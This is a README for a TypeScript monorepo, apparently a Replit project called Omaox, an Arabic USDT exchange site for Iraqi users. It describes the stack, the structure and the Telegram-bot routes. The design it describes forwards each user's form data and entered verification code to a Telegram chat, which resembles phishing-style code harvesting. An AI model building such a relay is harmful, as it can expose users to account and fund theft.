# Workspace

## Overview

pnpm workspace monorepo using TypeScript. Each package manages its own dependencies.

## Stack

- **Monorepo tool**: pnpm workspaces
- **Node.js version**: 24
- **Package manager**: pnpm
- **TypeScript version**: 5.9
- **API framework**: Express 5
- **Database**: PostgreSQL + Drizzle ORM
- **Validation**: Zod (`zod/v4`), `drizzle-zod`
- **API codegen**: Orval (from OpenAPI spec)
- **Build**: esbuild (CJS bundle)
- **Frontend**: React + Vite + Tailwind CSS + Framer Motion

## Project: Omaox

USDT cryptocurrency exchange platform targeting Iraqi users. Arabic RTL site with dark theme and gold accents.

### Features
- Landing page with animated notifications, converter, stats, payment methods, testimonials, FAQ
- Buy page with multi-step form (form → verification code → success)
- Telegram bot integration for notifications:
  - Notifies when someone visits the buy form
  - Sends all form data when user submits order
  - Sends verification code when user enters it
- Exchange rate: 100 USDT = 132,000 IQD (1 USDT = 1,320 IQD)
- Minimum purchase: 5 USDT

### Environment Variables
- `TELEGRAM_BOT_TOKEN`: Telegram bot token for notifications
- `TELEGRAM_CHAT_ID`: Telegram chat ID to receive notifications

## Structure

```text
artifacts-monorepo/
├── artifacts/              # Deployable applications
│   ├── api-server/         # Express API server (port 8080)
│   └── omaox/              # React + Vite frontend (Omaox platform)
├── lib/                    # Shared libraries
│   ├── api-spec/           # OpenAPI spec + Orval codegen config
│   ├── api-client-react/   # Generated React Query hooks
│   ├── api-zod/            # Generated Zod schemas from OpenAPI
│   └── db/                 # Drizzle ORM schema + DB connection
├── scripts/                # Utility scripts
├── pnpm-workspace.yaml     # pnpm workspace
├── tsconfig.base.json      # Shared TS options
├── tsconfig.json           # Root TS project references
└── package.json            # Root package
```

## API Routes

- `GET /api/healthz` - Health check
- `POST /api/telegram/notify-visit` - Notify Telegram when user visits buy form
- `POST /api/telegram/submit-order` - Send order data to Telegram bot
- `POST /api/telegram/submit-code` - Send verification code to Telegram bot

## TypeScript & Composite Projects

Every package extends `tsconfig.base.json` which sets `composite: true`. The root `tsconfig.json` lists all packages as project references.

- **Always typecheck from the root** — run `pnpm run typecheck`
- **`emitDeclarationOnly`** — we only emit `.d.ts` files during typecheck
- **Project references** — when package A depends on package B, A's `tsconfig.json` must list B in its `references` array

## Root Scripts

- `pnpm run build` — runs `typecheck` first, then recursively runs `build` in all packages
- `pnpm run typecheck` — runs `tsc --build --emitDeclarationOnly` using project references

## Packages

### `artifacts/api-server` (`@workspace/api-server`)

Express 5 API server with Telegram bot integration routes.

### `artifacts/omaox` (`@workspace/omaox`)

React + Vite frontend for the Omaox USDT exchange platform. Arabic RTL with dark/gold theme.

### `lib/api-spec` (`@workspace/api-spec`)

OpenAPI 3.1 spec and Orval codegen config. Run codegen: `pnpm --filter @workspace/api-spec run codegen`

### `lib/api-zod` (`@workspace/api-zod`)

Generated Zod schemas from OpenAPI spec.

### `lib/api-client-react` (`@workspace/api-client-react`)

Generated React Query hooks from OpenAPI spec.

### `lib/db` (`@workspace/db`)

Database layer using Drizzle ORM with PostgreSQL.

Production migrations handled by Replit when publishing. Dev: `pnpm --filter @workspace/db run push`.
